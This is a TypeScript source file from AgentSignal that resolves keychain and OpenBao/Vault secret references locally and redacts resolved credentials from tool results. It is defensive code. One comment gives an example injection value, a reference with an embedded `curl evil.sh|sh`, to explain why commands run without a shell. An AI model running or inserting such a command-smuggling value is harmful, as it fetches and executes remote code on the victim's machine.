/**
 * Secrets by reference: resolve on this machine, never hand the value to the
 * model.
 *
 * The design is in docs/design/secrets-by-reference.md. The short version is
 * that AgentSignal stores `keychain://deploy/token` and never the token, so a
 * breach of it exposes a pointer. This file is the half that turns a pointer
 * into a value, on the machine, at the moment of use.
 *
 * TWO MECHANISMS, and the second exists because the first is a promise rather
 * than a guarantee:
 *
 *   1. Nothing here returns a resolved value to a caller that puts it in a
 *      tool result. Tools ask for a value to USE -- substituted into a request,
 *      injected into a child process -- and the value goes nowhere else.
 *   2. Every value ever resolved is remembered and scrubbed out of every tool
 *      result on the way past. Belt and braces, because (1) is a property of
 *      code nobody has written yet, and the failure mode is a credential in a
 *      transcript, which cannot be taken back.
 *
 * (2) is what makes this safe to extend. A tool added next year that echoes
 * something it should not is caught by the same pass.
 */
import { execFile, execFileSync } from 'node:child_process';

/** Turns one kind of reference into a value. */
export type Resolver = {
  /** The URL scheme it claims, without the colon: `keychain`, `op`. */
  scheme: string;
  /** Resolve, or throw with a message that names the reference and not the value. */
  read(reference: string): Promise<string>;
};

/** Run a command without a shell. Injectable so tests never touch a real keychain. */
export type Run = (command: string, args: string[]) => Promise<string>;

const runCommand: Run = (command, args) =>
  new Promise((resolve, reject) => {
    // execFile, never exec: arguments are passed as an array and no shell
    // parses them. A reference is data that arrives from a server, and
    // `keychain://x/$(curl evil.sh|sh)` has to be a lookup that fails rather
    // than a command that runs.
    execFile(command, args, { timeout: 10_000 }, (error, stdout, stderr) => {
      if (error) {
        // stderr, not stdout: a failed lookup prints a diagnostic, but a
        // SUCCEEDED one prints the secret, and an error path that quotes
        // stdout is how the value ends up in a log.
        reject(new Error(stderr.trim() || error.message));
        return;
      }
      resolve(stdout);
    });
  });

/**
 * `keychain://<service>/<account>` out of the OS keychain.
 *
 * First because it is the only one that needs nothing installed -- every Mac
 * has `/usr/bin/security` -- so the whole path can be exercised on a machine
 * with no secrets manager. Its limitation is real and belongs in the docs
 * rather than in a surprise: a keychain item is per-machine and made by hand,
 * so a grant naming one only pays off once somebody has created it on each
 * machine. Portability arrives with a team manager.
 */
export function keychainResolver(run: Run = runCommand): Resolver {
  return {
    scheme: 'keychain',
    async read(reference) {
      const { service, account } = parseKeychain(reference);
      const value = await run('/usr/bin/security', [
        'find-generic-password',
        '-s',
        service,
        '-a',
        account,
        '-w',
      ]);
      // `security` terminates with a newline. Trailing whitespace in a bearer
      // token is the sort of thing that fails as a 401 an hour later.
      const trimmed = value.replace(/\n$/, '');
      if (!trimmed) throw new Error(`${reference} resolved to an empty value`);
      return trimmed;
    },
  };
}

/**
 * `bao://<mount>/<path>#<field>` out of OpenBao, or Vault.
 *
 * THE ONE THAT CROSSES MACHINES. A keychain item is made by hand on each
 * machine, so a grant naming one only pays off once somebody has created it
 * everywhere -- which is not sharing a secret, it is telling several people to
 * store the same one. A shared vault is the thing that actually answers "how
 * does the other side get this without it passing through a message body".
 *
 * The value never reaches AgentSignal either way: what travels is the sentence
 * `bao://floatplan/supabase#SERVICE_ROLE_KEY`, and the machine using it
 * resolves that with its OWN vault credentials. A breach of AgentSignal
 * exposes the sentence.
 *
 * NOT A LOGIN. This reads, and refuses to authenticate: a resolver that could
 * log in would need a credential of its own, stored somewhere, which is the
 * problem it was brought in to solve arriving one layer down. `BAO_TOKEN` (or
 * `VAULT_TOKEN`) is expected to be there already, put there by `bao login`, an
 * AppRole, or whatever the machine's own arrangement is. When it is missing
 * this says so and names the variable, rather than failing as a 403 that reads
 * like a permissions problem in the vault.
 *
 * THE CLI RATHER THAN THE HTTP API, deliberately. `bao`/`vault` already knows
 * the address, the namespace, the CA bundle and the token cache; reimplementing
 * that here means reimplementing it wrong on somebody's mTLS setup. The cost is
 * that the binary must be installed, which the error says plainly.
 */
export function baoResolver(run: Run = runCommand, env: NodeJS.ProcessEnv = process.env): Resolver {
  return {
    scheme: 'bao',
    async read(reference) {
      const { mount, path, field } = parseBao(reference);

      const binary = env.AGENTSIGNAL_BAO_BIN || (env.VAULT_ADDR && !env.BAO_ADDR ? 'vault' : 'bao');
      if (!env.BAO_TOKEN && !env.VAULT_TOKEN) {
        throw new Error(
          `${reference}: no BAO_TOKEN (or VAULT_TOKEN) in the environment, so there is nothing to ` +
            'read with. Run `bao login` on this machine, or give the agent an AppRole token. ' +
            'This resolver deliberately does not log in: a credential it could log in with would ' +
            'have to be stored somewhere, which is the problem a vault is here to solve.',
        );
      }

      let value: string;
      try {
        value = await run(binary, ['kv', 'get', '-field', field, `${mount}/${path}`]);
      } catch (error) {
        const detail = String((error as Error)?.message ?? '').trim();
        // ENOENT reads as "command failed" otherwise, and the fix -- install
        // the client -- is not deducible from that.
        if (/ENOENT|not found/i.test(detail) && !/no value found|No value found/i.test(detail)) {
          throw new Error(
            `${reference}: could not run \`${binary}\`. Install the OpenBao or Vault client, or ` +
              'set AGENTSIGNAL_BAO_BIN to its path.',
          );
        }
        throw new Error(`${reference}: ${detail || 'lookup failed'}`);
      }

      const trimmed = value.replace(/\n$/, '');
      if (!trimmed) throw new Error(`${reference} resolved to an empty value`);
      return trimmed;
    },
  };
}

/**
 * `bao://<mount>/<path>#<field>`.
 *
 * The FIELD is a fragment rather than the last path segment, because a KV
 * secret holds several fields and `bao://kv/floatplan/supabase/URL` cannot say
 * whether the last part is a field or a deeper path. The fragment is
 * unambiguous, and it is also the half most likely to be wrong, so it is worth
 * a message of its own when it is missing.
 */
export function parseBao(reference: string): { mount: string; path: string; field: string } {
  const match = /^bao:\/\/([^/#]+)\/([^#]+)#(.+)$/.exec(reference);
  if (!match) {
    throw new Error(
      `Not a vault reference: ${reference}. Expected bao://<mount>/<path>#<field>, ` +
        'for example bao://kv/floatplan/supabase#SERVICE_ROLE_KEY.',
    );
  }
  return {
    mount: decodeURIComponent(match[1]!),
    path: match[2]!.split('/').map(decodeURIComponent).join('/'),
    field: decodeURIComponent(match[3]!),
  };
}

export function parseKeychain(reference: string): { service: string; account: string } {
  const match = /^keychain:\/\/([^/]+)\/(.+)$/.exec(reference);
  if (!match) {
    throw new Error(
      `Not a keychain reference: ${reference}. Expected keychain://<service>/<account>.`,
    );
  }
  return { service: decodeURIComponent(match[1]!), account: decodeURIComponent(match[2]!) };
}

/**
 * Values resolved during this process's life, kept only to scrub them.
 *
 * In memory and never written down. The process dying is the whole retention
 * policy, which is the correct one: a cached secret on disk would recreate the
 * thing the design avoids.
 */
const resolved = new Set<string>();

/**
 * The shortest value worth scrubbing.
 *
 * A four-character secret cannot be redacted without mangling unrelated output
 * -- scrubbing every occurrence of `abcd` would eat words. Rather than pretend,
 * short values are left alone and the caller is told, because a redaction that
 * silently does not apply is worse than one that says it cannot.
 */
export const SHORTEST_REDACTABLE = 8;

/** Remember a value so it can never appear in a tool result. */
export function guard(value: string): { redactable: boolean } {
  if (value.length >= SHORTEST_REDACTABLE) {
    resolved.add(value);
    return { redactable: true };
  }
  return { redactable: false };
}

/** Forget everything. Tests only; a running server has no reason to. */
export function forgetAll(): void {
  resolved.clear();
}

/** Replace every guarded value in a string. */
export function redact(text: string): string {
  let out = text;
  for (const value of resolved) {
    if (out.includes(value)) out = out.split(value).join('[secret redacted]');
  }
  return out;
}

/**
 * Scrub a tool result, whatever shape it arrived in.
 *
 * Walks rather than assuming `{ content: [{ text }] }`, because the shape is
 * the SDK's and it grows: resource contents, structured output, an error
 * message built by string interpolation. Anything this misses is a credential
 * in a transcript, so it looks at every string it can reach.
 */
export function redactResult<T>(result: T): T {
  if (resolved.size === 0) return result;
  return walk(result) as T;
}

function walk(node: unknown): unknown {
  if (typeof node === 'string') return redact(node);
  if (Array.isArray(node)) return node.map(walk);
  if (node && typeof node === 'object') {
    const out: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(node)) out[key] = walk(value);
    return out;
  }
  return node;
}

/**
 * Resolve a reference and remember the value for scrubbing.
 *
 * Returns the value to the CALLER, which is the server, and it is the caller's
 * job never to put it in a result. That is not a guarantee, which is why
 * `redactResult` exists behind it.
 */
export async function resolveReference(
  reference: string,
  resolvers: Resolver[],
): Promise<{ value: string; redactable: boolean }> {
  const scheme = reference.split('://')[0];
  const resolver = resolvers.find((r) => r.scheme === scheme);
  if (!resolver) {
    throw new Error(
      `No resolver for ${scheme ?? 'that'} references. Known: ${
        resolvers.map((r) => `${r.scheme}://`).join(', ') || 'none'
      }.`,
    );
  }
  const value = await resolver.read(reference);
  return { value, ...guard(value) };
}

/**
 * Whether a grant may be used from here.
 *
 * Refused rather than noted, and it names both sides: a silent refusal is
 * indistinguishable from a missing grant, and somebody will spend an afternoon
 * on that. The check is local, like the resolution, so it cannot bind a
 * dishonest client -- it catches the accident, which is what this design is
 * for.
 */
export function scopeAllows(
  grantScope: string | null | undefined,
  here: string | null,
): { ok: true } | { ok: false; reason: string } {
  if (!grantScope) return { ok: true };
  if (grantScope === here) return { ok: true };
  return {
    ok: false,
    reason:
      `That secret is granted to ${grantScope}, and this session is ` +
      `${here ?? 'not in a repository'}. Refusing rather than resolving it.`,
  };
}

/**
 * Wrap a tool-registration function so every handler's result is scrubbed.
 *
 * Extracted rather than written inline at the call site so it can be tested.
 * It is the single place every tool passes through, which makes it the only
 * honest home for this guard -- and also the piece whose failure is invisible,
 * because a handler that is not wrapped behaves identically right up until the
 * moment it returns a credential.
 *
 * The handler is the LAST argument in every registration shape the SDK
 * accepts. A call whose last argument is not a function is handed straight
 * back untouched rather than guessed at.
 */
export function redactingRegistrar<T extends (...args: never[]) => unknown>(register: T): T {
  return ((...args: unknown[]) => {
    const last = args.length - 1;
    const handler = args[last];
    if (typeof handler === 'function') {
      const original = handler as (...a: unknown[]) => unknown;
      args[last] = async (...a: unknown[]) => redactResult(await original(...a));
    }
    return (register as unknown as (...a: unknown[]) => unknown)(...args);
  }) as unknown as T;
}

// ---------------------------------------------------------------------------
// An agent's OWN channel key, at rest
//
// Everything above is about secrets AgentSignal deliberately never holds. A
// minted channel key is the one credential it does hand out and the agent has
// to keep, so it gets the same treatment rather than an exception carved out
// for it: the value goes in the OS keychain and `agent.json` remembers a
// reference of exactly the shape a grant uses.
//
// The alternative it replaces was a live key sitting in a JSON file, defended
// by nothing but `0600`. That is not nothing -- another user cannot read it --
// but it is readable by every process running AS this user, which on a
// developer's laptop is a large and unexamined set.
// ---------------------------------------------------------------------------

/** Where an agent's own key lives, named the same way a grant names anything else. */
export function apiKeyReference(agentKey: string): string {
  return `keychain://agentsignal/${encodeURIComponent(agentKey)}`;
}

/**
 * Run a command without a shell, synchronously, with input on stdin.
 *
 * SYNCHRONOUS because both callers run before the server is serving -- the key
 * has to be in hand before `registerTier` reads whether a client exists -- and
 * there an await reorders startup rather than merely waiting. Injectable for
 * the same reason as its async twin: tests must never touch a real keychain.
 */
export type RunSync = (command: string, args: string[], input?: string) => string;

const runCommandSync: RunSync = (command, args, input) => {
  try {
    return execFileSync(command, args, {
      encoding: 'utf8',
      timeout: 10_000,
      input: input ?? '',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
  } catch (error) {
    // stderr, never stdout, for the reason the async twin gives: a FAILED
    // lookup prints a diagnostic, and a succeeded one prints the secret.
    const failed = error as { stderr?: string | Buffer; message?: string };
    throw new Error(String(failed.stderr ?? '').trim() || failed.message || `${command} failed`);
  }
};

/**
 * A way to keep this off a machine's real keychain.
 *
 * The tests are why. Twenty test files start real servers as child processes,
 * and a child process cannot be handed an injected `RunSync` -- so every one of
 * them wrote a fake key into the developer's login keychain and read it back,
 * which is a GUI prompt each time on macOS. Running the suite meant clicking
 * through a stack of them, and denying one failed tests for a reason that had
 * nothing to do with the code under test.
 *
 * Set anywhere it should not be touched: a test run, a shared machine, a CI
 * image with a keychain that outlives the job. The credential then stays where
 * it used to live before any of this existed -- in the identity file, mode
 * 0600 -- which `rememberApiKey` already treats as an ordinary outcome for
 * every machine that has no keychain at all.
 */
function keychainRefused(): boolean {
  const off = process.env.AGENTSIGNAL_NO_KEYCHAIN;
  return off !== undefined && off !== '' && off !== '0';
}

/**
 * WHICH STORE THIS MACHINE HAS, behind one reference shape.
 *
 * `keychain://<service>/<account>` stays the reference on every platform: it is
 * written into agent.json and into grants, so changing it per platform would
 * make an identity file mean different things on different machines. Only the
 * program behind it varies.
 *
 *   darwin   /usr/bin/security, which every Mac has.
 *   linux    secret-tool, the libsecret client, talking to whatever Secret
 *            Service is running -- GNOME Keyring, KWallet. Not installed
 *            everywhere, which is why a missing binary is an ordinary outcome
 *            rather than an error: the caller keeps the plaintext and carries
 *            on, exactly as it did before any store existed.
 *   anything Nothing yet, and saying so beats guessing. Windows has DPAPI and
 *   else     no built-in CLI that reads a secret back out -- cmdkey stores and
 *            will not retrieve -- so it needs a real design rather than a
 *            PowerShell one-liner written by somebody with no Windows machine
 *            to test it on. Until then it falls back to the file, which is
 *            what it does today.
 *
 * This is the half the vault resolver does not solve. A vault is for secrets
 * SHARED between people; this is where one agent's own key sits at rest on one
 * machine, and a laptop that needs a vault unsealed before an agent can start
 * has swapped a prompt for a bigger prompt.
 */
type Store = {
  read(service: string, account: string): string[];
  write(service: string, account: string): { args: string[]; input: string } | null;
  binary: string;
};

export function storeFor(platform: string = process.platform): Store | null {
  if (platform === 'darwin') {
    return {
      binary: '/usr/bin/security',
      read: (service, account) => ['find-generic-password', '-s', service, '-a', account, '-w'],
      write: (service, account) => ({
        args: [
          'add-generic-password',
          '-U',
          '-s',
          service,
          '-a',
          account,
          '-T',
          '/usr/bin/security',
          '-w',
        ],
        // Twice: `security` asks, then asks again to confirm.
        input: '',
      }),
    };
  }
  if (platform === 'linux') {
    return {
      binary: 'secret-tool',
      // `lookup` prints the secret with NO trailing newline, unlike `security`.
      // Trimming unconditionally is still right: a trailing newline in a bearer
      // token fails as a 401 an hour later, and there is never a legitimate one.
      read: (service, account) => ['lookup', 'service', service, 'account', account],
      write: (service, account) => ({
        // The label is what a person sees in Seahorse or KWallet. Naming it
        // after the product rather than the account means somebody auditing
        // their keyring can tell what put it there.
        args: ['store', '--label=AgentSignal', 'service', service, 'account', account],
        input: '',
      }),
    };
  }
  return null;
}

/** `keychain://<service>/<account>` out of the keychain, synchronously. */
export function readKeychainSync(
  reference: string,
  run: RunSync = runCommandSync,
  /*
    THE PLATFORM IS AN ARGUMENT because the store is chosen by it, and a test
    that injects `run` but not this one is testing whichever machine it happens
    to run on. That is not hypothetical: the command-shape assertions below were
    written on a Mac, passed there, and failed on the Linux runner -- where
    storeFor() hands back secret-tool and the fake `security` in the test has
    never heard of it. Green locally, red at publish, about code nobody touched.
  */
  platform: string = process.platform,
): string {
  // Only the real one. A test that injects `run` is testing this code and must
  // still reach its fake, or the switch would silently disable the coverage
  // along with the prompts.
  if (run === runCommandSync && keychainRefused()) {
    throw new Error('AGENTSIGNAL_NO_KEYCHAIN is set, so nothing is read from the keychain.');
  }
  const { service, account } = parseKeychain(reference);
  const store = storeFor(platform);
  if (!store) {
    throw new Error(
      `No credential store on ${process.platform}, so ${reference} cannot be read. ` +
        'The key stays in the identity file instead.',
    );
  }
  const value = run(store.binary, store.read(service, account));
  // `security` terminates with a newline and `secret-tool` does not. Trimming
  // either way is right: trailing whitespace in a bearer token is the sort of
  // thing that fails as a 401 an hour later.
  const trimmed = value.replace(/\n$/, '');
  if (!trimmed) throw new Error(`${reference} resolved to an empty value`);
  return trimmed;
}

/** Put a value at `reference`, replacing whatever is there. */
export function writeKeychainSync(
  reference: string,
  value: string,
  run: RunSync = runCommandSync,
  platform: string = process.platform,
): void {
  if (run === runCommandSync && keychainRefused()) {
    throw new Error('AGENTSIGNAL_NO_KEYCHAIN is set, so nothing is written to the keychain.');
  }
  const { service, account } = parseKeychain(reference);
  const store = storeFor(platform);
  if (!store) {
    throw new Error(
      `No credential store on ${process.platform}, so ${reference} cannot be written.`,
    );
  }

  /*
    THE VALUE GOES ON STDIN on every platform, and that is not a style choice.
    `security -w` with no argument and `secret-tool store` both read it there,
    and both would accept it as an argument instead -- which would put a live
    channel key in `ps` output for every process running as this user. A leak
    with a stopwatch on it.

    macOS wants it twice, because `security` asks and then asks again to
    confirm. secret-tool wants it once. Getting that wrong is a hang rather
    than an error, so it belongs next to the flags it pairs with rather than in
    the store table.
  */
  const written = store.write(service, account);
  if (!written) throw new Error(`No way to write ${reference} on ${process.platform}.`);
  const input = store.binary === '/usr/bin/security' ? `${value}\n${value}\n` : `${value}\n`;
  run(store.binary, written.args, input);
}

/**
 * Put a key in the keychain and PROVE it comes back out.
 *
 * The proof is the point. Moving a credential somewhere it cannot be read from
 * is worse than leaving it in plaintext -- the agent is broken rather than
 * merely exposed, and broken at the next start rather than now, when whoever
 * did it is watching. So the value is written, read straight back, and only a
 * byte-for-byte match earns the reference.
 *
 * Returns null rather than throwing because the caller's correct response is
 * to keep the plaintext and carry on. A machine with no keychain -- Linux, a
 * container, CI -- is a supported place to run an agent, not a failure.
 */
export function rememberApiKey(
  agentKey: string,
  value: string,
  run: RunSync = runCommandSync,
  platform: string = process.platform,
): string | null {
  const reference = apiKeyReference(agentKey);
  try {
    writeKeychainSync(reference, value, run, platform);
    return readKeychainSync(reference, run, platform) === value ? reference : null;
  } catch {
    return null;
  }
}
